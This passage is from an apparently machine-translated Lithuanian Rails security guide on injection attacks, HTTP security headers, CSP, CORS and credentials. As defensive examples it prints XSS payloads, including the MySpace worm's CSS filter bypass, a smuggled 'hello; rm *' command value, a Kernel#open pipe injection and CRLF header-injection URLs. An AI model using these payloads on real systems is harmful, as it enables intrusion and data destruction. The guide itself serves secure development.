<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

`eval()` funkcija yra košmaras ribotų sąrašų įvesties filtrams, nes ji leidžia stiliaus atributui paslėpti žodį "innerHTML":

```js
alert(eval('document.body.inne' + 'rHTML'));
```

Kitas kirminų autoriaus problema buvo MySpace filtravimas žodžio `"javascript"`, todėl autorius naudojo `"java<NEWLINE>script"`, kad tai apeitų:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

Kitas kirminų autoriaus problemos buvo [CSRF saugumo žetonai](#cross-site-request-forgery-csrf). Be jų jis negalėjo siųsti draugystės užklausos per POST. Jis tai apeidavo siųsdamas GET į puslapį tiesiog prieš pridedant vartotoją ir analizuodamas rezultatą CSRF žetonui gauti.
Galų gale jis gavo 4 KB kirminą, kurį įterpė į savo profilio puslapį.

[Moz-binding](https://securiteam.com/securitynews/5LP051FHPE) CSS savybė įrodė, kad tai yra dar vienas būdas įvesti JavaScript į CSS Gecko pagrindu veikiančiuose naršyklėse (pavyzdžiui, „Firefox“).

#### Gynimo priemonės

Šis pavyzdys vėl parodė, kad apribotas sąrašo filtravimas niekada nėra visiškas. Tačiau, kadangi tinklalapiuose pasitaikantis tinkintas CSS yra gana retas funkcionalumas, gali būti sunku rasti tinkamą leidžiamą CSS filtrą. _Jei norite leisti tinkintus spalvų ar vaizdų pasirinkimus, galite leisti vartotojui juos pasirinkti ir sukurti CSS tinklalapyje_. Jei tikrai reikia, naudokite „Rails“ „sanitize()“ metodą kaip modelį leidžiamam CSS filtrui.

### Tekstilės įterpimas

Jei norite teikti teksto formatavimą, kuris nėra HTML (dėl saugumo), naudokite žymėjimo kalbą, kuri yra konvertuojama į HTML serveryje. [RedCloth](http://redcloth.org/) yra tokia kalba „Ruby“, tačiau be atsargumo ji taip pat yra pažeidžiama XSS.

Pavyzdžiui, RedCloth išverčia „_test_“ į „<em>test<em>“, dėl ko tekstas tampa pasviru. Tačiau iki dabartinės 3.0.4 versijos ji vis dar yra pažeidžiama XSS. Gauti [visiškai naują 4 versiją](http://www.redcloth.org), kuri pašalino rimtus klaidas. Tačiau net ir ši versija turi [kelias saugumo klaidas](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), todėl vis dar taikomos gynimo priemonės. Štai pavyzdys 3.0.4 versijai:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Naudokite `:filter_html` parinktį, kad pašalintumėte HTML, kuris nebuvo sukurtas naudojant Tekstilės procesorių.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

Tačiau tai nevisiškai filtruoja visą HTML, keli žymės bus paliktos (pagal dizainą), pavyzdžiui, `<a>`:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Gynimo priemonės

Rekomenduojama _naudoti RedCloth kartu su leidžiamu įvesties filtru_, kaip aprašyta XSS gynimo priemonėse.

### Ajax įterpimas

PASTABA: _Ajax veiksmams taip pat reikia taikyti tuos pačius saugumo priemones kaip ir „normaliems“ veiksmams. Tačiau yra bent vienas išimtis: išvestis turi būti išvengta jau valdiklyje, jei veiksmas neišveda rodinio._

Jei naudojate [in_place_editor įskiepį](https://rubygems.org/gems/in_place_editing) ar veiksmus, kurie grąžina eilutę, o ne rodinį, _turite išvengti grąžinamosios reikšmės išvengimo veiksmo_. Kitu atveju, jei grąžinamoji reikšmė yra XSS eilutė, kenksmingas kodas bus vykdomas grįžtant į naršyklę. Išvengkite bet kokios įvesties reikšmės naudodami `h()` metodą.

### Komandų eilutės įterpimas

PASTABA: _Atsargiai naudokite vartotojo pateiktas komandų eilutės parametrus._

Jei jūsų programa turi vykdyti komandas pagrindinėje operacinėje sistemoje, „Ruby“ kalboje yra keletas metodų: `system(command)`, `exec(command)`, `spawn(command)` ir `` `command` ``. Jums reikės būti ypatingai atsargiam su šiomis funkcijomis, jei vartotojas gali įvesti visą komandą ar jos dalį. Tai yra dėl to, kad daugumoje komandų interpretatorių galite vykdyti kitą komandą pirmosios komandos pabaigoje, jas sujungdami kabliataškiu (`;`) arba vertikalia juosta (`|`).

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# spausdina "hello" ir ištrina failus esančius dabartiniame kataloge
```

Gynimo priemonė yra _naudoti `system(command, parameters)` metodą, kuris saugiai perduoda komandų eilutės parametrus_.

```ruby
system("/bin/echo", "hello; rm *")
# spausdina "hello; rm *" ir ne ištrina failų
```

#### Kernel#open pažeidžiamumas

`Kernel#open` vykdo OS komandą, jei argumentas prasideda vertikalia juosta (`|`).

```ruby
open('| ls') { |file| file.read }
# grąžina failų sąrašą kaip eilutę per `ls` komandą
```

Gynimo priemonės yra naudoti `File.open`, `IO.open` arba `URI#open`. Jos nevykdo OS komandos.

```ruby
File.open('| ls') { |file| file.read }
# nevykdo `ls` komandos, tiesiog atidaro `| ls` failą, jei jis egzistuoja

IO.open(0) { |file| file.read }
# atidaro standartinį įvesties srautą. neatima eilutės kaip argumento

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# atidaro URI. `URI()` neleidžia `| ls`
```

### Antraštės įterpimas

ĮSPĖJIMAS: _HTTP antraštės yra dinamiškai generuojamos ir tam tikromis aplinkybėmis vartotojo įvestis gali būti įterpta. Tai gali sukelti neteisingą nukreipimą, XSS arba HTTP atsakymo padalijimą._

HTTP užklausos antraštėse yra „Referer“, „User-Agent“ (kliento programinė įranga) ir „Cookie“ laukai, tarp kitų. Pavyzdžiui, atsakymo antraštėse yra būsenos kodas, „Cookie“ ir „Location“ (nukreipimo tikslinio URL) laukai. Visi jie yra vartotojo pateikti ir gali būti manipuliuojami su daugiau ar mažiau pastangų. _Neužmirškite išvengti šių antraščių laukų, taip pat._ Pavyzdžiui, kai rodomas vartotojo agentas administravimo srityje.
Be to, _svarbu žinoti, ką darote, dalinai pagrindžiant atsakymo antraštes naudodami vartotojo įvestį._ Pavyzdžiui, norite nukreipti vartotoją atgal į konkretų puslapį. Tam įvedėte "referer" lauką formoje, kad nukreiptumėte į nurodytą adresą:

```ruby
redirect_to params[:referer]
```

Kas vyksta yra tai, kad "Rails" įdeda eilutę į "Location" antraštės lauką ir siunčia 302 (nukreipimas) būseną naršyklei. Pirmas dalykas, kurį padarytų kenkėjiškas vartotojas, yra tai:

```
http://www.jūsųprograma.com/valdiklis/veiksmas?referer=http://www.kenksmingas.tld
```

Ir dėl klaidos (Ruby ir) "Rails" iki 2.1.2 versijos (neįtraukiant jos), hakeris gali įterpti bet kokius antraštes; pavyzdžiui, taip:

```
http://www.jūsųprograma.com/valdiklis/veiksmas?referer=http://www.kenksmingas.tld%0d%0aX-Header:+Sveiki!
http://www.jūsųprograma.com/valdiklis/veiksmas?referer=kelias/į/jūsų/programą%0d%0aLocation:+http://www.kenksmingas.tld
```

Atkreipkite dėmesį, kad `%0d%0a` yra URL-koduotas kaip `\r\n`, tai yra "carriage-return" ir "line-feed" (CRLF) "Ruby". Taigi, antrojo pavyzdžio rezultatas HTTP antraštei bus toks, nes antra "Location" antraštės laukas perrašo pirmąjį.

```http
HTTP/1.1 302 Laikinai perkelta
(...)
Location: http://www.kenksmingas.tld
```

Taigi, _atako vektoriai antraštės įterpimui remiasi CRLF simbolių įterpimu į antraštės lauką._ Ir ką gali padaryti puolėjas su neteisingu nukreipimu? Jie gali nukreipti į phishing svetainę, kuri atrodo tokia pati kaip jūsų, bet prašo prisijungti dar kartą (ir siunčia prisijungimo duomenis puolėjui). Arba jie gali įdiegti kenksmingą programinę įrangą per naršyklės saugumo spragas toje svetainėje. "Rails" 2.1.2 versijoje šie simboliai yra išvengiami "Location" laukui naudojant `redirect_to` metodą. _Įsitikinkite, kad tai padarote patys, kai kuriate kitus antraštes su vartotojo įvestimi._

#### DNS Rebinding ir Host antraštės atakos

DNS Rebinding yra būdas manipuliuoti domeno vardų rezoliucija, kuris dažnai naudojamas kaip kompiuterinės atakos forma. DNS Rebinding apgaudinėja "same-origin" politiką, išnaudodamas domeno vardų sistemą (DNS). Jis perjungia domeną į kitą IP adresą ir tada kompromituoja sistemą, vykdydamas atsitiktinį kodą prieš jūsų "Rails" programą iš pakeisto IP adreso.

Rekomenduojama naudoti `ActionDispatch::HostAuthorization` tarpinę programinės įrangos dalį, kad apsisaugotumėte nuo DNS Rebinding ir kitų Host antraštės atakų. Ji yra įjungta pagal numatytuosius nustatymus vystymo aplinkoje, ją turite įjungti gamyboje ir kitose aplinkose nustatydami leistinų priimančiųjų sąrašą. Taip pat galite konfigūruoti išimtis ir nustatyti savo atsakymo programą.

```ruby
Rails.application.config.hosts << "produktas.com"

Rails.application.config.host_authorization = {
  # Pašalinkite užklausas /healthcheck/ keliui iš priimančiųjų tikrinimo
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # Pridėkite pasirinktinę "Rack" programą atsakymui
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bloga užklausa"]]
  end
}
```

Daugiau informacijos galite rasti [`ActionDispatch::HostAuthorization` tarpinės programinės įrangos dokumentacijoje](/configuring.html#actiondispatch-hostauthorization)

#### Atsakymo skaidymas

Jei buvo įmanomas antraštės įterpimas, tai gali būti įmanoma ir atsakymo skaidymas. HTTP protokole antraštės bloką seka du CRLF simboliai ir faktiniai duomenys (dažniausiai HTML). Atsakymo skaidymo idėja yra įterpti du CRLF simbolius į antraštės lauką, po to seka kitas atsakymas su kenksmingu HTML. Atsakymas bus:

```http
HTTP/1.1 302 Rasta [Pirmas standartinis 302 atsakymas]
Date: An, 12 Bal 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 Gerai [Antras naujas atsakymas, sukurtas puolėjo]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;labas&lt;/font&gt;&lt;/html&gt; [Rodytas kenksmingas įvesties puslapis]
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Tam tikromis aplinkybėmis tai pristatytų kenksmingą HTML aukai. Tačiau tai atrodo veikia tik su "Keep-Alive" ryšiais (ir daugelis naršyklių naudoja vienkartinį ryšį). Tačiau negalite tam pasitikėti. _Bet kokiu atveju tai yra rimta klaida, ir turėtumėte atnaujinti savo "Rails" iki 2.0.5 arba 2.1.2 versijos, kad pašalintumėte antraštės įterpimo (ir taip pat atsakymo skaidymo) riziką._

Nesaugus užklausos generavimas
-----------------------

Dėl to, kaip "Active Record" interpretuoja parametrus kartu su tuo, kaip "Rack" analizuoja užklausos parametrus, buvo galima pateikti netikėtų duomenų bazės užklausų su `IS NULL` sąlygomis. Kaip atsakas į šią saugumo problemą ([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ), [CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) ir [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)) buvo įvestas `deep_munge` metodas kaip sprendimas, kad "Rails" būtų saugus pagal numatytuosius nustatymus.

Pavyzdys pažeidžiamo kodo, kurį gali naudoti puolėjas, jei `deep_munge` nebūtų atliktas, yra:

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

Kai `params[:token]` yra vienas iš: `[nil]`, `[nil, nil, ...]` arba `['foo', nil]`, jis apeis tikrinimą dėl `nil`, bet `IS NULL` arba `IN ('foo', NULL)` sąlygos vis tiek bus pridėtos prie SQL užklausos.
Norint išlaikyti "Rails" saugumą pagal numatytuosius nustatymus, `deep_munge` keičia kai kuriuos reikšmes į `nil`. Lentelėje pateikiamos parametrų reikšmės pagal `JSON`, siunčiamą užklausoje:

| JSON                              | Parametrai               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

Jei žinote riziką ir žinote, kaip su ja elgtis, galite grįžti prie seno elgesio ir išjungti `deep_munge` konfigūruodami savo programą:

```ruby
config.action_dispatch.perform_deep_munge = false
```

HTTP saugumo antraštės
---------------------

Norint pagerinti jūsų programos saugumą, "Rails" gali būti sukonfigūruotas taip, kad grąžintų HTTP saugumo antraštes. Kai kurios antraštės yra sukonfigūruotos numatytuoju būdu, kitos turi būti aiškiai sukonfigūruotos.

### Numatytosios saugumo antraštės

Numatytais nustatymais "Rails" sukonfigūruotas grąžinti šias atsakymo antraštes. Jūsų programa grąžina šias antraštes kiekvienam HTTP atsakymui.

#### `X-Frame-Options`

[`X-Frame-Options`][] antraštė nurodo, ar naršyklė gali atvaizduoti puslapį `<frame>`, `<iframe>`, `<embed>` ar `<object>` žymėje. Numatytuoju būdu ši antraštė nustatoma kaip `SAMEORIGIN`, leidžianti atvaizduoti tik tame pačiame domene. Nustatykite ją kaip `DENY`, jei norite visiškai neleisti atvaizduoti, arba pašalinkite šią antraštę, jei norite leisti atvaizduoti visuose domenuose.

#### `X-XSS-Protection`

[Pasenusi senoji antraštė](https://owasp.org/www-project-secure-headers/#x-xss-protection), numatytais nustatymais "Rails" nustatyta kaip `0`, kad išjungtų problemiškus senus XSS auditorius.

#### `X-Content-Type-Options`

[`X-Content-Type-Options`][] antraštė numatytais nustatymais "Rails" nustatyta kaip `nosniff`. Tai sustabdo naršyklę spėlioti failo MIME tipą.

#### `X-Permitted-Cross-Domain-Policies`

Numatytais nustatymais ši antraštė "Rails" nustatyta kaip `none`. Tai neleidžia "Adobe Flash" ir PDF klientams įterpti jūsų puslapio kituose domenuose.

#### `Referrer-Policy`

[`Referrer-Policy`][] antraštė numatytais nustatymais "Rails" nustatyta kaip `strict-origin-when-cross-origin`. Kryžminėms kilmės užklausoms ši antraštė siunčia tik kilmės vietą "Referer" antraštėje. Tai apsaugo nuo privačių duomenų nutekėjimo, kurie gali būti pasiekiami iš kitų URL dalių, pvz., kelio ir užklausos eilutės.

#### Numatytųjų antraščių konfigūravimas

Šios antraštės numatytai sukonfigūruotos taip:

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

Galite perrašyti šias antraštes arba pridėti papildomų antraščių `config/application.rb`:

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

Arba galite jas pašalinti:

```ruby
config.action_dispatch.default_headers.clear
```

### `Strict-Transport-Security` antraštė

HTTP [`Strict-Transport-Security`][] (HTST) atsakymo antraštė užtikrina, kad naršyklė automatiškai atnaujins ryšį į HTTPS dabartiniams ir ateities ryšiams.

Antraštė pridedama prie atsakymo, įjungus `force_ssl` parinktį:

```ruby
  config.force_ssl = true
```

### `Content-Security-Policy` antraštė

Norint apsisaugoti nuo XSS ir įterpimo atakų, rekomenduojama apibrėžti [`Content-Security-Policy`][] atsakymo antraštę savo programai. "Rails" suteikia DSL, kuris leidžia jums sukonfigūruoti antraštę.

Apibrėžkite saugumo politiką atitinkamame inicializavimo faile:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Nurodykite pažeidimų ataskaitų URI
  policy.report_uri "/csp-violation-report-endpoint"
end
```

Globaliai sukonfigūruota politika gali būti perrašyta pagal resursą:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

Arba ji gali būti išjungta:

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Naudokite lambda funkcijas, kad galėtumėte įterpti per užklausą keičiamas reikšmes, pvz., sąskaitų subdomenus daugiamandatėje programoje:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

#### Pažeidimų pranešimų teikimas

Įjunkite [`report-uri`][] direktyvą, kad pranešimai apie pažeidimus būtų teikiami nurodytame URI:

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

Migravimo seno turinio metu galbūt norėsite pranešti apie pažeidimus, bet neįgyvendinti politikos. Nustatykite [`Content-Security-Policy-Report-Only`][] atsakymo antraštę, kad būtų pranešama tik apie pažeidimus:

```ruby
Rails.application.config.content_security_policy_report_only = true
```

Arba perrašykite ją valdiklyje:

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

#### Pridėti "Nonce"

Jei svarstote dėl `'unsafe-inline'`, apsvarstykite naudoti "nonce" vietoj to. [Nonsai suteikia žymiai geresnį](https://www.w3.org/TR/CSP3/#security-nonces) sprendimą nei `'unsafe-inline'`, kai įgyvendinate turinio saugumo politiką esamame kode.
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

Yra keletas kompromisų, kuriuos reikia apsvarstyti konfigūruojant nonce generatorių.
Naudoti `SecureRandom.base64(16)` yra geras numatytasis variantas, nes tai
sugeneruos naują atsitiktinį nonce kiekvienam užklausimui. Tačiau šis metodas
yra nesuderinamas su [sąlyginio GET talpinimo](caching_with_rails.html#conditional-get-support)
dėl to, kad nauji nonce reikšmės sukels naujas ETag reikšmes kiekvienam užklausimui. 
Alternatyva per užklausimą atsitiktinai generuojamiems nonce būtų naudoti sesijos id:

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

Šis generavimo metodas yra suderinamas su ETag, tačiau jo saugumas priklauso nuo
to, kad sesijos id būtų pakankamai atsitiktiniai ir nebūtų atskleidžiami nesaugiuose
slapukų failuose.

Pagal numatytuosius nustatymus, nonces bus taikomi `script-src` ir `style-src`, jei yra nustatytas nonce generatorius. `config.content_security_policy_nonce_directives` gali būti
naudojamas keisti, kurie direktyvai naudos nonces:

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

Kai nonce generavimas yra sukonfigūruotas inicializavime, automatinės nonce reikšmės
gali būti pridėtos prie skriptų žymų, perduodant `nonce: true` kaip dalį `html_options`:

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

Taip pat veikia su `javascript_include_tag`:

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

Naudokite [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
pagalbininką, kad sukurtumėte meta žymą "csp-nonce" su sesijos nonce reikšme
leidžiantiems įterpti `<script>` žymas.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

Tai naudojama "Rails UJS" pagalbininkui sukurti dinamiškai
įkeltiems įterptiems `<script>` elementams.

### `Feature-Policy` Antraštė

PASTABA: `Feature-Policy` antraštė buvo pervadinta į `Permissions-Policy`.
`Permissions-Policy` reikalauja skirtingo įgyvendinimo ir dar nėra
palaikoma visose naršyklėse. Norint išvengti šio middleware pervadinimo
ateityje, naudojamas naujas pavadinimas middleware, tačiau
laikoma sena antraštės pavadinimas ir įgyvendinimas.

Norėdami leisti arba blokuoti naršyklės funkcijų naudojimą, galite nustatyti [`Feature-Policy`][]
atsakymo antraštę savo programai. "Rails" teikia DSL, kuris leidžia jums
konfigūruoti antraštę.

Apibrėžkite politiką atitinkamame inicializavime:

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

Visuotinai sukonfigūruota politika gali būti perrašoma pagal išteklių bazę:

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### Cross-Origin Resursų Bendrinimas

Naršyklės apriboja iš skriptų inicijuotus kryžminius kilmės HTTP užklausas. Jei
norite paleisti "Rails" kaip API ir paleisti priekinės pabaigos programą atskirame domene, jums
reikia įgalinti [Cross-Origin Resursų Bendrinimą](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS).

Galite naudoti [Rack CORS](https://github.com/cyu/rack-cors) middleware, kad
tvarkytumėte CORS. Jei jūsų programa jau sukurta su `--api` parinktimi,
Rack CORS turbūt jau sukonfigūruotas ir galite praleisti toliau nurodytus
žingsnius.

Norėdami pradėti, pridėkite "rack-cors" juostą į savo Gemfile:

```ruby
gem 'rack-cors'
```

Toliau pridėkite inicializatorių, skirtą sukonfigūruoti middleware:

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

Intraneto ir administravimo sauga
---------------------------

Intraneto ir administravimo sąsajos yra populiarių atakų tikslai, nes jos leidžia gauti privilegijuotą prieigą. Nors tai reikalautų keleto papildomų saugos priemonių, realiame pasaulyje situacija yra priešinga.

2007 metais buvo pirmasis specialiai sukurtas trojanas, kuris pavogė informaciją iš Intraneto, t. y. "Monster for employers" svetainės, kuri priklauso "Monster.com", internetinės darbo paieškos programos. Specialiai sukurti trojanai yra labai reti ir rizika yra gana maža, tačiau tai tikrai yra galimybė ir pavyzdys, kaip svarbus yra kliento prievado saugumas. Tačiau didžiausia grėsmė Intraneto ir administravimo programoms yra XSS ir CSRF.

### Kryžminis skriptavimas

Jei jūsų programa iš naujo rodo kenksmingą naudotojo įvestį iš ekstraneto, programa bus pažeidžiama nuo XSS. Vartotojo vardai, komentarai, šlamšto pranešimai, užsakymo adresai yra tik keletas neįprastų pavyzdžių, kur gali būti XSS.

Turint vieną vietą administravimo sąsajoje ar Intranete, kurioje įvestis nebuvo išvalyta, visa programa tampa pažeidžiama. Galimi eksploitai apima privilegijuoto administratoriaus slapuko pavogimą, įterpimo iframe, skirta pavogti administratoriaus slaptažodį arba įdiegiant kenksmingą programinę įrangą per naršyklės saugumo spragas, kad būtų užvaldytas administratoriaus kompiuteris.

Kreipkitės į Įterpimo skyrių dėl priemonių prieš XSS.

### Kryžminis svetainės užklausos suklastojimas
Cross-Site Request Forgery (CSRF), taip pat žinomas kaip Cross-Site Reference Forgery (XSRF), yra didžiulė atakos metodika, leidžianti puolėjui atlikti viską, ką gali administratorius ar Intranet vartotojas. Kaip jau matėte, kaip veikia CSRF, čia pateikiami keletas pavyzdžių, ką puolėjai gali daryti Intranet ar administravimo sąsajoje.

Realus pavyzdys yra [maršrutizatoriaus konfigūracijos keitimas naudojant CSRF](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html). Puolėjai išsiuntė kenksmingą el. laišką su CSRF į jį, Meksikos vartotojams. Laiškas tvirtino, kad vartotojui laukia elektroninė kortelė, bet jame taip pat buvo įterptas vaizdo žymė, kuri sukėlė HTTP-GET užklausą, keičiančią vartotojo maršrutizatoriaus (kuris yra populiarus modelis Meksikoje) konfigūraciją. Užklausa pakeitė DNS nustatymus taip, kad užklausos į Meksikoje esančią banko svetainę būtų nukreiptos į puolėjo svetainę. Visi, kurie per tą maršrutizatorių prisijungė prie banko svetainės, matė puolėjo sukurtą melagingą svetainę ir buvo pavogti jų prisijungimo duomenys.

Kitas pavyzdys yra Google Adsense el. pašto adreso ir slaptažodžio pakeitimas. Jei auka būtų prisijungusi prie Google Adsense, Google reklamos kampanijų administravimo sąsajos, puolėjas galėtų pakeisti aukos prisijungimo duomenis.

Kitas populiarus puolimas yra jūsų internetinės aplikacijos, tinklaraščio ar forumo užpildymas kenksmingu XSS. Žinoma, puolėjui reikia žinoti URL struktūrą, bet dauguma Rails URL yra gana aiškūs arba jų bus lengva sužinoti, jei tai yra atviro kodo aplikacijos administravimo sąsaja. Puolėjas gali net padaryti 1 000 sėkmingų spėjimų, įtraukdamas kenksmingas IMG žymes, kurios išbandys kiekvieną galimą kombinaciją.

Dėl _priemonių prieš CSRF administravimo sąsajose ir Intranet aplikacijose, kreipkitės į CSRF skyriaus priemones_.

### Papildomi atsargumo priemonės

Bendroji administravimo sąsaja veikia taip: ji yra įsikūrusi adresu www.example.com/admin, prieigos teisės turi tik tuomet, jei admin flag yra nustatytas User modelyje, vartotojo įvestis yra rodoma iš naujo ir leidžiama administratoriui ištrinti/pridėti/redaguoti bet kokius duomenis. Čia yra keletas mintys apie tai:

* Labai svarbu _pagalvoti apie blogiausią scenarijų_: Ką daryti, jei kas nors tikrai pavogė jūsų slapukus ar vartotojo prisijungimo duomenis. Galite _įvesti vaidmenis_ administravimo sąsajoje, kad apribotumėte puolėjo galimybes. O kaip apie _specialius prisijungimo duomenis_ administravimo sąsajai, skirtingus nuo tų, naudojamų viešajai aplikacijos daliai. Arba _specialų slaptažodį labai rimtiems veiksmams_?

* Ar administratoriui tikrai reikia pasiekti sąsają iš viso pasaulio? Pagalvokite apie _prisijungimo apribojimą iki tam tikrų šaltinių IP adresų_. Patikrinkite request.remote_ip, kad sužinotumėte vartotojo IP adresą. Tai nėra visiškai patikima, bet puiki kliūtis. Atminkite, kad gali būti naudojamas tarpininkas.

* _Padėkite administravimo sąsają į specialų subdomeną_, pvz., admin.application.com ir padarykite ją atskira aplikacija su savo vartotojų valdymu. Tai padaro neįmanomu pavogti administravimo slapuko iš įprasto domeno, www.application.com. Tai yra dėl tos pačios kilmės politikos jūsų naršyklėje: Įterptas (XSS) skriptas www.application.com negali perskaityti slapuko iš admin.application.com ir atvirkščiai.

Aplinkos saugumas
----------------------

Šiame vadove neaptariama, kaip apsaugoti jūsų aplikacijos kodą ir aplinkas. Tačiau prašome apsaugoti savo duomenų bazės konfigūraciją, pvz., `config/database.yml`, pagrindinį raktą `credentials.yml` ir kitus neužšifruotus paslaptis. Galite dar labiau apriboti prieigą, naudodami aplinkai specifines šių failų versijas ir kitus, kuriuose gali būti jautrios informacijos.

### Individualūs prisijungimo duomenys

Rails saugo paslaptis `config/credentials.yml.enc`, kuris yra užšifruotas ir todėl negali būti tiesiogiai redaguojamas. Rails naudoja `config/master.key` arba alternatyviai ieško aplinkos kintamojo `ENV["RAILS_MASTER_KEY"]`, kad užšifruotų paslaptis. Kadangi paslaptys yra užšifruotos, jas galima saugoti versijų kontrolėje, kol tik pagrindinis raktas yra saugus.

Pagal numatytuosius nustatymus, paslapties faile yra aplikacijos
`secret_key_base`. Jame taip pat galima saugoti kitas paslaptis, pvz., prieigos raktus prie išorinių API.

Norėdami redaguoti paslapties failą, paleiskite `bin/rails credentials:edit`. Ši komanda sukurs paslapties failą, jei jis neegzistuoja. Be to, ši komanda sukurs `config/master.key`, jei nėra apibrėžtas pagrindinis raktas.

Paslaptys, saugomos paslapties faile, yra pasiekiamos per `Rails.application.credentials`.
Pavyzdžiui, su šiuo iššifruotu `config/credentials.yml.enc`:

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key` grąžina `"SOMEKEY"`. `Rails.application.credentials.system.access_key_id` grąžina `"1234AB"`.
Jei norite, kad būtų iškelta išimtis, kai kuri raktas yra tuščias, galite naudoti bang versiją:

```ruby
# Kai some_api_key yra tuščias...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key yra tuščias
```

PATARIMAS: Sužinokite daugiau apie kredencialus naudodami `bin/rails credentials:help`.

ĮSPĖJIMAS: Saugokite savo pagrindinį raktą. Neįtraukite savo pagrindinio rakto į komitą.

Priklausomybių valdymas ir CVE
------------------------------

Mes nekeičiame priklausomybių tik tam, kad skatintume naudoti naujas versijas, įskaitant saugumo problemas. Tai yra dėl to, kad programos savininkai turi rankiniu būdu atnaujinti savo juosteles, nepaisant mūsų pastangų. Naudokite `bundle update --conservative gem_name` saugiai atnaujinti pažeidžiamas priklausomybes.

Papildomi ištekliai
--------------------

Saugumo aplinka kinta ir svarbu būti atnaujintam, nes praleidus naują pažeidžiamumą gali būti katastrofiška. Papildomus išteklius apie (Rails) saugumą galite rasti čia:

* Prenumeruokite Rails saugumo [pašto sąrašą](https://discuss.rubyonrails.org/c/security-announcements/9).
* [Brakeman - Rails saugumo skeneris](https://brakemanscanner.org/) - Atlikti statinę saugumo analizę Rails aplikacijoms.
* [Mozilla saugumo gairės tinklui](https://infosec.mozilla.org/guidelines/web_security.html) - Rekomendacijos apie temas, apimančias turinio saugumo politiką, HTTP antraštes, slapukus, TLS konfigūraciją, ir kt.
* [Geras saugumo tinklaraštis](https://owasp.org/), įskaitant [Cross-Site scripting Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md).
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
